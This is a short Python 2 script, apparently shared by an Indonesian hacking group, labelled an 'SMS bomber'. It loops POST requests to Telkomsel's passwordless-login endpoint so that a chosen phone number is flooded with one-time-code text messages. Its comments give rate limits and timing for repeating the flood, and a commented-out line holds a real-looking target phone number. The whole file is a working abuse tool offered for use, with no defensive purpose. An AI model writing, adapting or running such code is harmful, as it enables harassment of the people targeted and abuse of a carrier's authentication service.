#-*-coding:utf8;-*-
#qpy:2
#qpy:console

import requests
import time
import json
import os
#pernomor MAX 11 Pesan
#Tunggu 3 menit (Token expire 3 MENIT), kalau mau Ngeflood lagi, dengan No HP yang sama

os.system("clear")
def tlkomb(no, jum,t):
    count = 0
    while count <= jum:
        count += 1
        print "\nPesan Ke: %s\nMengirim ke: %s" % (count, no)
        data = {"phone_number":no,
                "connection": "sms",
                "request_language":None,
                "phone_verified":None}
        header = {"Referer":"https://telkomsel.com/",
                  "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')"}
        go = requests.post("https://tdwidm.telkomsel.com/passwordless/start", data=data, headers=header)  
        if go.status_code == 200:
            print " SUKSES KE: ", no+"\n"
        else:
            print " GAGAL\n"
        time.sleep(t)
if __name__ == "__main__":
    print "-".join("|"*18)
    print "\t-SMS TSEL-APPS BOMBER"
    print "\t-SOURCE by K3COT"
    print "\t-Python Coding: Qiuby Zhukhi"
    print "\t--[PBM]-- TEAM 100% BAXOT"
    print "-".join("|"*18)
#Ini kalau mau isi lewat terminal input metode
    no = raw_input("Nomor: ")
    jum = int(raw_input("Jumlah Flood: "))
    timeout = int(raw_input("Delay/Jeda: "))
    """
    Dibawah ini kalau mau isi lewat code langsung.
    kalau pake ini,
    Hapus 3 Tanda tagar (#) dan hapus Variabel script no,jum,timeout serta isinya
    yang terletak tepat di atas pesan ini.
    """
#    no = "+6282259071376" # Nomor HP
#    jum = 1 #flood
#    timeout = 1 # jeda

    tlkomb(no, jum, timeout)
else:
    print "TADAAA :v "
